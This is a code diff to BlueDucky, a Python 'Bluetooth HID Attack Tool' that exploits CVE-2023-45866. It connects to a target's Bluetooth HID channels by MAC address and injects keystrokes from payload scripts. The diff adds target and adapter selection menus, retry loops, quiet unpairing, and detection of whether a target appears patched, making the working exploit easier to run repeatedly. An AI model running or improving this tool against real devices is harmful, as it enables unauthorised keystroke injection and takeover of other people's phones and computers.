@@ -5,8 +5,12 @@ from enum import Enum
 import subprocess
 import os
 
-from utils.menu_functions import (main_menu, read_duckyscript, run, restart_bluetooth_daemon, get_target_address)
+from utils.menu_functions import (main_menu, read_duckyscript, run, restart_bluetooth_daemon, get_target_address, select_adapter)
 from utils.register_device import register_hid_profile, agent_loop
+
+# Delay (seconds) between reconnection attempts in the attack loop. HID keystroke
+# timings elsewhere are intentionally left as-is (they are protocol-timing critical).
+RECONNECT_DELAY_SEC = 2
 
 child_processes = []
 
@@ -60,7 +64,10 @@ def setup_logging():
 
 
 class ConnectionFailureException(Exception):
-    pass
+    def __init__(self, message, port=None, refused=False):
+        super().__init__(message)
+        self.port = port          # L2CAP PSM that failed (17=HID control, 19=HID interrupt)
+        self.refused = refused    # True on errno 111 (ECONNREFUSED) -> target likely patched
 
 class Adapter:
     def __init__(self, iface):
@@ -267,18 +274,14 @@ class L2CAPClient:
             self.connected = True
             log.debug("SUCCESS! connected on port %d" % self.port)
         except Exception as ex:
-            # Color Definition Again just to avoid errors I should've made a class for this.
-            red = "\033[91m"
-            blue = "\033[94m"
-            reset = "\033[0m"
-
-            error = True
             self.connected = False
             log.error("ERROR connecting on port %d: %s" % (self.port, ex))
-            raise ConnectionFailureException(f"Connection failure on port {self.port}")
-            if (error == True & self.port == 14):
-                print("{reset}[{red}!{reset}] {red}CRITICAL ERROR{reset}: {reset}Attempted Connection to {red}{target_address} {reset}was {red}denied{reset}.")
-                return self.connected
+            # errno 111 (ECONNREFUSED) = target actively refused the HID channel -> likely patched
+            refused = (getattr(ex, "errno", None) == 111
+                       or (isinstance(getattr(ex, "args", None), tuple) and 111 in ex.args)
+                       or "refused" in str(ex).lower())
+            raise ConnectionFailureException(
+                f"Connection failure on port {self.port}", port=self.port, refused=refused)
 
 
 
@@ -637,6 +640,33 @@ def setup_and_connect(connection_manager, target_address, adapter_id):
     establish_connections(connection_manager)
     return connection_manager.clients[19]
 
+def enable_bluetooth_adapter(adapter_id='hci0'):
+    """Bring Bluetooth up ONLY while the tool runs. It is kept off/blocked at rest
+    so the BT attack surface is not left exposed on a machine that is always on."""
+    try:
+        subprocess.run(['sudo', 'rfkill', 'unblock', 'bluetooth'], check=False)
+        subprocess.run(['sudo', 'hciconfig', adapter_id, 'up'], check=False)
+        subprocess.run('echo -e "power on\\n" | bluetoothctl', shell=True, check=False,
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1)
+    except Exception as e:
+        try: log.error(f"Failed to enable Bluetooth adapter {adapter_id}: {e}")
+        except Exception: pass
+
+
+def disable_bluetooth_adapter(adapter_id='hci0'):
+    """Return Bluetooth to an OFF/blocked state so the vector is closed once the tool exits.
+    Best-effort and must never raise during shutdown."""
+    try:
+        subprocess.run('echo -e "power off\\n" | bluetoothctl', shell=True, check=False,
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['sudo', 'hciconfig', adapter_id, 'down'], check=False)
+        subprocess.run(['sudo', 'rfkill', 'block', 'bluetooth'], check=False)
+    except Exception as e:
+        try: log.error(f"Failed to disable Bluetooth adapter {adapter_id}: {e}")
+        except Exception: pass
+
+
 def troubleshoot_bluetooth():
     # Added this function to troubleshoot common issues before access to the application is granted
 
@@ -647,109 +677,160 @@ def troubleshoot_bluetooth():
     try:
         subprocess.run(['bluetoothctl', '--version'], check=True, stdout=subprocess.PIPE)
     except subprocess.CalledProcessError:
-        print("{reset}[{red}!{reset}] {red}CRITICAL{reset}: {blue}bluetoothctl {reset}is not installed or not working properly.")
+        print(f"{reset}[{red}!{reset}] {red}CRITICAL{reset}: {blue}bluetoothctl {reset}is not installed or not working properly.")
         return False
 
     # Check for Bluetooth adapters
     result = subprocess.run(['bluetoothctl', 'list'], capture_output=True, text=True)
     if "Controller" not in result.stdout:
-        print("{reset}[{red}!{reset}] {red}CRITICAL{reset}: No {blue}Bluetooth adapters{reset} have been detected.")
+        print(f"{reset}[{red}!{reset}] {red}CRITICAL{reset}: No {blue}Bluetooth adapters{reset} have been detected.")
         return False
 
-    # List devices to see if any are connected
+    # NOTE: BlueDucky targets a device by MAC address and runs its own scan,
+    # so a previously paired/known device is NOT required. Having no cached
+    # devices is normal and must not abort startup; just print an FYI.
     result = subprocess.run(['bluetoothctl', 'devices'], capture_output=True, text=True)
     if "Device" not in result.stdout:
-        print("{reset}[{red}!{reset}] {red}CRITICAL{reset}: No Compatible {blue}Bluetooth devices{reset} are connected.")
-        return False
+        print(f"{reset}[{blue}i{reset}] No previously known Bluetooth devices; a target will be scanned for by the MAC you provide.")
 
     # if no issues are found then continue
     return True
 
 # Main function
 def main():
-    blue = "\033[0m"
+    blue = "\033[94m"
     red = "\033[91m"
     reset = "\033[0m"
+
     parser = argparse.ArgumentParser(description="Bluetooth HID Attack Tool")
     parser.add_argument('--adapter', type=str, default='hci0', help='Specify the Bluetooth adapter to use (default: hci0)')
     args = parser.parse_args()
-    adapter_id = args.adapter
-        
-    main_menu()
-    target_address = get_target_address()
-    if not target_address:
-        log.info("No target address provided. Exiting..")
-        return
-    
+    default_adapter = args.adapter
+
     script_directory = os.path.dirname(os.path.realpath(__file__))
-    payload_folder = os.path.join(script_directory, 'payloads/')  # Specify the relative path to the payloads folder.
-    payloads = os.listdir(payload_folder)
+    payload_folder = os.path.join(script_directory, 'payloads/')
 
-    blue = "\033[0m"
-    red = "\033[91m"
-    reset = "\033[0m"
-    print(f"\nAvailable payloads{blue}:")
-    for idx, payload_file in enumerate(payloads, 1): # Check and enumerate the files inside the payload folder.
-        print(f"{reset}[{blue}{idx}{reset}]{blue}: {blue}{payload_file}")
-
-    blue = "\033[0m"
-    red = "\033[91m"
-    reset = "\033[0m"
-    payload_choice = input(f"\n{blue}Enter the number that represents the payload you would like to load{reset}: {blue}")
-    selected_payload = None
-
-    try:
-        payload_index = int(payload_choice) - 1
-        selected_payload = os.path.join(payload_folder, payloads[payload_index])
-    except (ValueError, IndexError):
-        print(f"Invalid payload choice. No payload selected.")
-
-    if selected_payload is not None:
-        print(f"{blue}Selected payload{reset}: {blue}{selected_payload}")
-        duckyscript = read_duckyscript(selected_payload)
-    else:
-        print(f"{red}No payload selected.")
-
-
-    
-    if not duckyscript:
-        log.info("Payload file not found. Exiting.")
-        return
-
-    adapter = setup_bluetooth(target_address, adapter_id)
-    adapter.enable_ssp()
-    
-    current_line = 0
-    current_position = 0
-    connection_manager = L2CAPConnectionManager(target_address)
-
-    while True:
+    def ask_continue():
         try:
-            hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
-            process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
-            time.sleep(2)
-            break  # Exit loop if successful
+            ans = input(f"\n{blue}Return to menu to try another target?{reset} {blue}({reset}y{blue}/{reset}n{blue}): {reset}").strip().lower()
+        except EOFError:
+            return False
+        return ans in ('y', 'yes')
 
-        except ReconnectionRequiredException as e:
-            log.info(f"{reset}Reconnection required. Attempting to reconnect{blue}...")
-            current_line = e.current_line
-            current_position = e.current_position
-            connection_manager.close_all()
-            # Sleep before retrying to avoid rapid reconnection attempts
-            time.sleep(2)
+    # Top-level menu loop: every run returns here instead of crashing out.
+    while True:
+        main_menu()
+        # Pick which adapter to use (e.g. a long-range USB dongle like hci1);
+        # defaults to --adapter / hci0. Single-adapter machines auto-select.
+        adapter_id = select_adapter(default_adapter)
+
+        target_address = get_target_address()
+        if not target_address:
+            log.info("No target address provided. Exiting..")
+            return
+
+        # ---- payload selection ----
+        payloads = os.listdir(payload_folder)
+        print(f"\nAvailable payloads{blue}:{reset}")
+        for idx, payload_file in enumerate(payloads, 1):
+            print(f"{reset}[{blue}{idx}{reset}]{blue}: {blue}{payload_file}{reset}")
+        payload_choice = input(f"\n{blue}Enter the number that represents the payload you would like to load{reset}: {blue}")
+        selected_payload = None
+        try:
+            payload_index = int(payload_choice) - 1
+            if payload_index < 0:
+                raise IndexError
+            selected_payload = os.path.join(payload_folder, payloads[payload_index])
+        except (ValueError, IndexError):
+            print(f"{red}[!] Invalid payload choice.{reset}")
+
+        duckyscript = None
+        if selected_payload is not None:
+            print(f"{blue}Selected payload{reset}: {blue}{selected_payload}{reset}")
+            duckyscript = read_duckyscript(selected_payload)
+        if not duckyscript:
+            print(f"{red}[!] No valid payload loaded.{reset}")
+            if not ask_continue():
+                return
+            continue
+
+        # ---- run the attack, gracefully handling any failure ----
+        connection_manager = None
+        try:
+            adapter = setup_bluetooth(target_address, adapter_id)
+            adapter.enable_ssp()
+
+            current_line = 0
+            current_position = 0
+            connection_manager = L2CAPConnectionManager(target_address)
+
+            while True:
+                try:
+                    hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
+                    process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
+                    time.sleep(2)
+                    print(f"\n{blue}[+] Payload delivered to {reset}{target_address}{blue}.{reset}")
+                    break  # success
+
+                except ReconnectionRequiredException as e:
+                    log.info(f"{reset}Reconnection required. Attempting to reconnect{blue}...")
+                    current_line = e.current_line
+                    current_position = e.current_position
+                    connection_manager.close_all()
+                    # Sleep before retrying to avoid rapid reconnection attempts
+                    time.sleep(RECONNECT_DELAY_SEC)
+
+                finally:
+                    # unpair the target device between attempts (quietly)
+                    command = f'echo -e "remove {target_address}\n" | bluetoothctl'
+                    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+        except ConnectionFailureException as e:
+            port = getattr(e, 'port', None)
+            if getattr(e, 'refused', False):
+                print(f"\n{red}[!] Connection REFUSED by {reset}{target_address}{red} on HID port {port}.{reset}")
+                print(f"{blue}[i] The target appears PATCHED against CVE-2023-45866,{reset}")
+                print(f"{blue}    or it is not a vulnerable Android/Linux device / not in pairing mode.{reset}")
+            else:
+                print(f"\n{red}[!] Could not reach {reset}{target_address}{red} on HID port {port}.{reset}")
+                print(f"{blue}[i] Target is likely asleep, out of Bluetooth range, or the address is wrong.{reset}")
+            print(f"{blue}[i] No HID injection was performed.{reset}")
+
+        except KeyboardInterrupt:
+            print(f"\n{blue}Interrupted - returning to menu.{reset}")
+
+        except Exception as e:
+            # Never dump a raw traceback at the user; summarise and return to menu.
+            print(f"\n{red}[!] Attack aborted: {type(e).__name__}: {e}{reset}")
+            log.debug("unexpected error during attack", exc_info=True)
 
         finally:
-            # unpair the target device
-            blue = "\033[94m"
-            reset = "\033[0m"
+            if connection_manager is not None:
+                try:
+                    connection_manager.close_all()
+                except Exception:
+                    pass
 
-            command = f'echo -e "remove {target_address}\n" | bluetoothctl'
-            subprocess.run(command, shell=True)
-            print(f"{blue}Successfully Removed device{reset}: {blue}{target_address}{reset}")
+        if not ask_continue():
+            return
+
 
 if __name__ == "__main__":
     setup_logging()
     log = logging.getLogger(__name__)
+
+    # Bluetooth is kept OFF at rest as a security posture. Determine which adapter
+    # the run will use (mirrors main()'s --adapter, default hci0), power it on for
+    # the duration of the tool, and guarantee it is powered off/blocked again on exit
+    # (normal return, errors, sys.exit, or Ctrl-C).
+    adapter_arg = 'hci0'
+    if '--adapter' in sys.argv:
+        try:
+            adapter_arg = sys.argv[sys.argv.index('--adapter') + 1]
+        except (ValueError, IndexError):
+            adapter_arg = 'hci0'
+
+    enable_bluetooth_adapter(adapter_arg)
     try:
         if troubleshoot_bluetooth():
             main()
@@ -757,3 +838,4 @@ if __name__ == "__main__":
             sys.exit(0)
     finally:
         terminate_child_processes()
+        disable_bluetooth_adapter(adapter_arg)
